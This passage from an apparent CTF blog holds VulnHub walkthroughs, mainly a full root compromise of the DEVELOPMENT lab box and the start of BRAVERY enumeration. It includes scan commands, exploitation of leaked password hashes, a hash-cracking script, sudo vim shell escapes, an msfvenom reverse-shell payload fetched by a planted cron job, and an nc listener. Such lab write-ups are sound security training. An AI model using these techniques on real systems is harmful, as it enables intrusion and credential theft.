</span><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>fluffy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>fluffy<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>fluffy<span class="o">)</span>
bash-4.3# <span class="nb">cat</span> /root/proof.txt
Congratulations on rooting MERCY. :-<span class="o">)</span>
</code></pre></div></div>


  
    <h1 class="post-title">VulnHub - digitalworld.local DEVELOPMENT</h1>
	<p class="post-date text-bold text-upcase">
	<span>April 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This is designed for OSCP practice, and the original version of the machine was used for a CTF.</p>

<p><strong>Author:</strong> Donavan</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/digitalworldlocal-development,280/">https://www.vulnhub.com/entry/digitalworldlocal-development,280/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>Let’s start discovering our target with netdiscover, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts 

 5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 282 
 __________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname  
 <span class="nt">--------------------------------------------------------------------------</span>
 192.168.179.130 00:0c:29:9e:13:ea      4     240  VMware, Inc.        
 192.168.179.254 00:50:56:ec:79:b5      1      42  VMware, Inc.       
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Discovered the target is time to enumerate all TCP open ports, for this I used nmap whith the following instruction:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.130 <span class="nt">-oG</span> tcp-scan-all-ports.txt
...
PORT     STATE SERVICE
22/tcp   open  ssh
113/tcp  open  ident
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
MAC Address: 00:0C:29:9E:13:EA <span class="o">(</span>VMware<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>With nmap I proceeded to perform an aggressive scan to enumerate services and versions running on open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p22</span>,113,139,445,8080 <span class="nt">-Pn</span> 192.168.179.130 <span class="nt">-oN</span> tcp-service-enumeration.txt
...
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 <span class="o">(</span>RSA<span class="o">)</span>
|_  256 24:6b:85:e3:ab:90:5c:ec:d5:83:49:54:cd:98:31:95 <span class="o">(</span>ED25519<span class="o">)</span>
113/tcp  open  ident?
|_auth-owners: oident
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
|_auth-owners: root
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
|_auth-owners: root
8080/tcp open  http-proxy  IIS 6.0
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 29 Jun 2021 20:16:34 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: <span class="s2">"230-57de32091ad69"</span>
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     &lt;html&gt;
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;p&gt;Welcome to the Development Page.&lt;/p&gt;
|     &lt;br/&gt;
|     &lt;p&gt;There are many projects <span class="k">in </span>this box. View some of these projects at html_pages.&lt;/p&gt;
|     &lt;br/&gt;
|     &lt;p&gt;WARNING! We are experimenting a host-based intrusion detection system. Report all <span class="nb">false </span>positives to patrick@goodtech.com.sg.&lt;/p&gt;
|     &lt;br/&gt;
|     &lt;br/&gt;
|     &lt;br/&gt;
|     &lt;hr&gt;
|     &lt;i&gt;Powered by IIS 6.0&lt;/i&gt;
|     &lt;/body&gt;
|     &lt;<span class="o">!</span><span class="nt">--</span> Searching <span class="k">for </span>development secret page... where could it be? <span class="nt">--</span><span class="o">&gt;</span>
|     &lt;<span class="o">!</span><span class="nt">--</span> Patrick, Head of Development--&gt;
|     &lt;/html&gt;
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 29 Jun 2021 20:16:35 GMT
|     Server: IIS 6.0
|     Allow: GET,POST,OPTIONS,HEAD
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p>We focus on port 8080, browsing the web page we see a message, for view some of the projects visit <strong>html_pages</strong>.</p>

<p><img src="/assets/images/development/screenshot-1.png" alt="" /></p>

<p>We visit that resource and find a list of web file names.</p>

<p><img src="/assets/images/development/screenshot-2.png" alt="" /></p>

<p>Enumerating these web files, in the downloads.html resource, visiting the page source I found the name of a pcap file, as shown in the following screenshots:</p>

<p><img src="/assets/images/development/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/development/screenshot-4.png" alt="" /></p>

<p>Then I download the test.pcap file with wget and filter this by http requests with tshark.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget 192.168.179.130:8080/test.pcap
root@kali:~<span class="nv">$ </span>tshark <span class="nt">-r</span> test.pcap <span class="nt">-T</span> fields <span class="nt">-e</span> http.host <span class="nt">-e</span> http.request.uri <span class="nt">-Y</span> <span class="s1">'http.request'</span> 2&gt;/dev/null | <span class="nb">sort</span> <span class="nt">-u</span> | column <span class="nt">-t</span>
192.168.254.157:8080  /developmentsecretpage/directortestpagev1.php
192.168.254.160       /qinyi/motivation.html
</code></pre></div></div>
<p>I find a request made to port 8080, I access this URL and we are presented an alert box, the same one that redirects us to the director page, then log out this page.</p>

<p><img src="/assets/images/development/screenshot-5.png" alt="" /></p>

<p><img src="/assets/images/development/screenshot-6.png" alt="" /></p>

<p>We try to log in to this login page with <strong>admin:admin</strong> or any credential.</p>

<p><img src="/assets/images/development/screenshot-7.png" alt="" /></p>

<p>We see the following error, I googled and find that it is a <strong>Simple Tex-File Login script (SiTeFilo)</strong> and is vulnerable to File Disclosure/Remote File Inclusion, the exploit you can find here <a href="https://www.exploit-db.com/exploits/7444">https://www.exploit-db.com/exploits/7444</a></p>

<p><img src="/assets/images/development/screenshot-8.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="file-disclosure">File Disclosure</h3>

<p>I Download the exploit to the attacking machine and we review its content.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://www.exploit-db.com/download/7444
root@kali:~<span class="nv">$ </span>less 7444.txt
...
<span class="o">[</span>0x02] Bug:[Remote File Inclusion]

<span class="o">[!]</span> EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path<span class="o">=[</span>remote_txt_shell]
...
<span class="o">[</span>0x03] Bug:[Sensitive Data Disclosure]
...
In this login system, sensible datas like username and password are stored <span class="k">in </span>a <span class="nb">local
</span>text file , so we can get sensitive information just going to this txt file <span class="nb">.</span> The name of
this file is <span class="nb">set </span><span class="k">in </span>slogin_lib.inc.php. By default is: slog_users.txt

<span class="o">[!]</span> EXPLOIT: /[path]/slog_users.txt
...
</code></pre></div></div>

<p>I tried exploiting by Remote File Inclusion but for some reason it doesn’t work and I opt for Sensitive Data Disclosure wich allows me to read usernames and passwords in the <strong>slog_users.txt</strong> file.</p>

<p><img src="/assets/images/development/screenshot-9.png" alt="" /></p>

<p>I downloaded the <strong>slog_users.txt</strong> file and filtered the password hashes to a file called hashes.txt.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://192.168.179.130:8080/developmentsecretpage/slog_users.txt
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>slog_users.txt 
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81
patrick, 87e6d56ce79af90dbe07d387d3d0579e
qiu, ee64497098d0926d198f54f6d5431f98
root@kali:~<span class="nv">$ </span><span class="nb">awk</span> <span class="s1">'{print $2}'</span> slog_users.txt <span class="o">&gt;</span> hashes.txt
</code></pre></div></div>

<p>I developed a python script to crack these md5 hashes.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">re</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nb">hash</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">f"https://md5.gromweb.com/?md5=</span><span class="si">{</span><span class="nb">hash</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">md5_decrypt</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"\sstring</span><span class="se">\"</span><span class="s">&gt;(.*?)&lt;/.*"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">md5_decrypt</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">hashes</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"hashes.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">for</span> <span class="nb">hash</span> <span class="ow">in</span> <span class="n">hashes</span><span class="p">:</span>
        <span class="n">cracked</span><span class="o">=</span><span class="n">decrypt</span><span class="p">(</span><span class="nb">hash</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">cracked</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="nb">hash</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">cracked</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>
<p>We execute the script and obtain the passwords.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>./decrypt.py 
4a8a2b374f463b7aedbb44a066363b81: 12345678900987654321
87e6d56ce79af90dbe07d387d3d0579e: P@ssw0rd25
ee64497098d0926d198f54f6d5431f98: qiu
</code></pre></div></div>
<p>We log in to ssh with the username <strong>intern</strong> and password <strong>12345678900987654321</strong> and we have access to a limited shell, to scape this we execute the instruction as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh intern@192.168.179.130 
intern@192.168.179.130<span class="s1">'s password: 
intern:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
intern:~$ echo os.system("/bin/bash")
intern@development:~$ 
</span></code></pre></div></div>

<p>I tried to access via ssh with the <strong>patrick</strong> user but he was not allowed, so from the <strong>intern</strong> user I changed to the <strong>patrick</strong> user with the password <strong>P@ssw0rd25</strong>, listing the sudo permissions for this user I found that he was allowed run nano and vim.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>intern@development:~<span class="nv">$ </span>su patrick
Password: 
patrick@development:/home/intern<span class="nv">$ </span>
patrick@development:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>patrick on development:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User patrick may run the following commands on development:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/vim
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/nano
patrick@development:~<span class="nv">$ </span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>
<p><strong>Privilege scalation with vim</strong></p>

<p>To escalate privileges with vim we will abuse its ability to execute commands, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patrick@development:~<span class="nv">$ </span><span class="nb">sudo </span>vim <span class="nt">-c</span> <span class="s1">':!/bin/bash'</span>

root@development:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<p><strong>Privilege escalation with nano</strong></p>

<p>Another way to escalate privileges is to create a cron job in the <strong>cron.d</strong> directory to download a linux payload, give it execute permissions, and run it, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patrick@development:~<span class="nv">$ </span><span class="nb">sudo </span>nano /etc/cron.d/evilcron
</code></pre></div></div>
<p><img src="/assets/images/development/screenshot-10.png" alt="" /></p>

<p>Then we will create a linux payload with the following instruction:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-a</span> x64 <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.179.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> elf <span class="nt">-o</span> back.door
</code></pre></div></div>

<p>We set up a nc listener and after a minute the cron job will download and execute the payload giving us a shell, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
192.168.179.130 - - <span class="o">[</span>23/Apr/2021 17:36:01] <span class="s2">"GET /back.door HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.130] 36224
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="nb">uname</span> <span class="nt">-a</span>
Linux development 4.15.0-34-generic <span class="c">#37-Ubuntu SMP Mon Aug 27 15:21:48 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
<span class="nb">cat</span> /root/proof.txt
Congratulations on rooting DEVELOPMENT! :<span class="o">)</span>
</code></pre></div></div>

<p>Another way to get root on this box is through kernel exploitation which is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18955">CVE-2018-18955</a>, you can find the exploit <a href="https://www.exploit-db.com/exploits/47165">here</a>, or also through <strong>lxd</strong> since the user patrick is member of the group lxd.</p>


  
    <h1 class="post-title">VulnHub - digitalworld.local BRAVERY</h1>
	<p class="post-date text-bold text-upcase">
	<span>April 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This is designed for OSCP practice, and the original version of the machine was used for a CTF.</p>

<p><strong>Author:</strong> Donavan</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/">https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>We start by discovering the target host with a ping scan as shown below:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1/24  
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-20 15:14 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.129
Host is up <span class="o">(</span>0.00059s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:0C:29:D0:FA:E4 <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.254
Host is up <span class="o">(</span>0.00012s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:50:56:EB:CB:4D <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.1
Host is up.
Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>4.35 seconds
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Discover the target, our next goal is to find open ports, for this we will do a TCP port scan with nmap.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">--open</span> 192.168.179.129 <span class="nt">-oG</span> nmap-all-tcp-ports
...
Not shown: 65522 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3306/tcp  open  mysql
8080/tcp  open  http-proxy
20048/tcp open  mountd
38849/tcp open  unknown
42475/tcp open  unknown
MAC Address: 00:0C:29:D0:FA:E4 <span class="o">(</span>VMware<span class="o">)</span>
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>A large number of open ports were found, we will proceed to perform the version and service enumeration with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,53,80,111,139,443,445,2049,3306,8080,20048,38849,42475 192.168.179.129 <span class="nt">-oN</span> tcp-service-enum
...
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 4d:8f:bc:01:49:75:83:00:65:a9:53:a9:75:c6:57:33 <span class="o">(</span>RSA<span class="o">)</span>
|   256 92:f7:04:e2:09:aa:d0:d7:e6:fd:21:67:1f:bd:64:ce <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 fb:08:cd:e8:45:8c:1a:c1:06:1b:24:73:33:a5:e4:77 <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp    open  domain      dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp    open  http        Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/5.4.16<span class="o">)</span>
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp   open  rpcbind     2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      38849/tcp   nlockmgr
|   100021  1,3,4      45542/tcp6  nlockmgr
|   100021  1,3,4      52880/udp6  nlockmgr
|   100021  1,3,4      56837/udp   nlockmgr
|   100024  1          40998/tcp6  status
|   100024  1          42475/tcp   status
|   100024  1          47099/udp   status
|   100024  1          60525/udp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
443/tcp   open  ssl/http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/5.4.16<span class="o">)</span>
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: 400 Bad Request
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>SomeOrganization/stateOrProvinceName<span class="o">=</span>SomeState/countryName<span class="o">=</span><span class="nt">--</span>
| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>SomeOrganization/stateOrProvinceName<span class="o">=</span>SomeState/countryName<span class="o">=</span><span class="nt">--</span>
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-06-10T15:53:25
| Not valid after:  2019-06-10T15:53:25
| MD5:   0fa7 c8d5 15ec c28f e37a df78 dcf6 b49f
|_SHA-1: 1c6d ee6d 1ab8 06c0 a8bf da93 2a6f f0f1 b758 5284
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>445/tcp   open  netbios-ssn Samba smbd 4.7.1 <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
2049/tcp  open  nfs_acl     3 <span class="o">(</span>RPC <span class="c">#100227)</span>
3306/tcp  open  mysql       MariaDB <span class="o">(</span>unauthorized<span class="o">)</span>
8080/tcp  open  http        nginx 1.12.2
| http-methods: 
|_  Supported Methods: GET HEAD
| http-robots.txt: 4 disallowed entries 
|_/cgi-bin/ /qwertyuiop.html /private /public
|_http-server-header: nginx/1.12.2
|_http-title: Welcome to Bravery! This is SPARTA!
20048/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
38849/tcp open  nlockmgr    1-4 <span class="o">(</span>RPC <span class="c">#100021)</span>
42475/tcp open  status      1 <span class="o">(</span>RPC <span class="c">#100024)</span>
MAC Address: 00:0C:29:D0:FA:E4 <span class="o">(</span>VMware<span class="o">)</span>
Service Info: Host: BRAVERY
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p><strong>Web service on port 80</strong></p>

<p>We start by enumerating hidden files and directories with gobuster as shown in the following syntax:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.129/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span>
...
http://192.168.179.129/about                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 79]
http://192.168.179.129/1                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
http://192.168.179.129/2                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
http://192.168.179.129/3                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
http://192.168.179.129/4                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
http://192.168.179.129/contactus            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 27]
http://192.168.179.129/5                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
http://192.168.179.129/6                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
http://192.168.179.129/7                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
http://192.168.179.129/9                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
http://192.168.179.129/0                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
http://192.168.179.129/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 239] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.129/uploads/]
http://192.168.179.129/8                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 30]                                       

</code></pre></div></div>
<p>From the result obtained, the request to the following URL we get a message mentioning that ports 80 and 8080 are best friends, somehow this gives me to understand that these ports may be related in a certein way.</p>

<p><img src="/assets/images/bravery/screenshot-1.png" alt="" /></p>

<p>In the following request we find a note specifying about a cuppa CMS account.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.129/uploads/files/internal/department/procurement/sara/note.txt
</code></pre></div></div>

<p><img src="/assets/images/bravery/screenshot-2.png" alt="" /></p>

<p><strong>Web service on port 8080</strong></p>

<p>Then we enumerate with gobuster the web service running on port 8080.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.129:8080/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span>
...
http://192.168.179.129:8080/about                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 503]
http://192.168.179.129:8080/public               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 185] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.129:8080/public/]
http://192.168.179.129:8080/private              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 185] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.129:8080/private/]

</code></pre></div></div>
<p>When we access the <strong>public</strong> directory we find with a web page, but we didn’t find anything interesting.</p>

<p><img src="/assets/images/bravery/screenshot-3.png" alt="" /></p>

<p>Then I proceed to create a dictionary with cewl, and we generate a combinations series with john, to then enumerate possible hidden files and directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>cewl http://192.168.179.129:8080/public <span class="nt">-w</span> cewl-domain-list.txt 
root@kali:~<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>cewl-domain-list.txt <span class="nt">--rules</span> <span class="nt">--stdout</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> cewl-final-list.txt
</code></pre></div></div>

<p><strong>Re-enumerating Port 80</strong></p>

<p>After enumerating on port 8080 with the dictionary created with cewl, and finding nothing I head to enumerating on the port 80 and found the following directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.129 <span class="nt">-w</span> cewl-final-list.txt <span class="nt">-e</span>
...
http://192.168.179.129/about                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 79]
http://192.168.179.129/about?               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 79]
